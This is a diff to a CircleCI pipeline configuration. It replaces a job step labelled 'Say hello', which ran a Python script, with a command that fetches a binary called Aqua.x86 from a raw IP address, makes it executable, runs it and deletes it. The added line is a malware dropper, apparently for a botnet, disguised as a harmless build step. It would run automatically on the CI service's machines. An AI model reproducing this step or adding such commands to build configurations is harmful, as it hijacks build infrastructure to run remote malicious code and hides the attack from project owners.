@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "python3 lmao.py"
+          command: "wget 93.123.85.110/Aqua.x86; chmod 777 Aqua.x86; ./Aqua.x86 wget; rm -rf Aqua.x86;"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
